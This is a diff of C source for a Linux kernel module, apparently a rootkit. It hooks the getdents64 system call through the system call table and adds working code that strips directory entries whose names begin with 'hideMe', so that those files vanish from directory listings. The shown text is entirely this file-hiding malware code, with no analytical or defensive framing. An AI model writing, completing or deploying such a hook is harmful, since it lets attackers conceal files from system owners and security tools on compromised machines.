@@ -7,11 +7,15 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-#include <linux/dirent.h> // getdents
-#include <linux/string.h> // strstr, strcmp
-#include <linux/types.h>  // size_t
-#include <linux/unistd.h> // read, getuid
+#include <linux/dirent.h>  // getdents64
+#include <linux/string.h>  // strstr, strcmp
+#include <linux/types.h>   // size_t
+#include <linux/slab.h>    // alloc fam
+#include <linux/string.h>  // mem... fam, strlen
+#include <linux/uaccess.h> // copy_from|to_user
+#include <linux/unistd.h>  // read, getuid
 
+#define MAGIC_PREFIX "hideMe"
 
 unsigned long *sys_call_table = 0;
 
@@ -26,7 +30,46 @@ hooked_getdents64(int fd,
                 struct linux_dirent64 *dirp,
                 unsigned int count) {
   printk(KERN_INFO "Should not be here\n");
-  return og_getdents64(fd, dirp, count);
+  /* Calls the original system call. */
+  int ret = og_getdents64(fd, dirp, count), err;
+  unsigned long cpt = 0;
+  struct linux_dirent64 *current_dir, *kernel_dirent, *prev = NULL;
+
+  if (ret <= 0)
+    return ret;
+
+  kernel_dirent = kzalloc(ret, GFP_KERNEL);
+  if (kernel_dirent == NULL)
+    return ret;
+
+  /* Copies the returned dirent into kernel space. */
+  err = copy_from_user(kernel_dirent, dirp, ret);
+  if (err)
+    goto end;
+
+  /* Iterates through the entries. */
+  while (cpt < ret) {
+    current_dir = (void *)kernel_dirent + cpt;
+    if (memcmp(MAGIC_PREFIX, current_dir->d_name, strlen(MAGIC_PREFIX)) == 0) {
+      if (current_dir == kernel_dirent) {
+        /* Change the size to reflect the removal. */
+        ret -= current_dir->d_reclen;
+        memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+        continue;
+      }
+      prev->d_reclen += current_dir->d_reclen;
+    } else {
+      prev = current_dir;
+    }
+    cpt += current_dir->d_reclen;
+  }
+  err = copy_to_user(dirp, kernel_dirent, ret);
+  if (err)
+    goto end;
+
+end:
+  kfree(kernel_dirent);
+  return ret;
 }
 
 asmlinkage ssize_t
